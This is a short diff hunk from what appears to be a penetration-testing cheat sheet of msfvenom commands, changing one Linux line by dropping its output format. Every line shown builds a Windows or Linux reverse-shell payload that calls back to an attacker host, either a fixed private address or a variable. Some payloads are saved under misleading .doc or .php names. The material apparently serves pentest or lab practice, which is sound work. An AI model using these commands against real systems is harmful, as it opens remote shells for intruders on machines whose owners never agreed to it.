@@ -25,7 +25,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.163 LPORT=9090 EXITFUNC=t
 msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f hta-psh > shell.doc
 
 # Linux 64 bit PHP
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=443 -f elf > shell.php
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=443	 > shell.php
 
 # Windows PHP
 msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f exe > shell.php
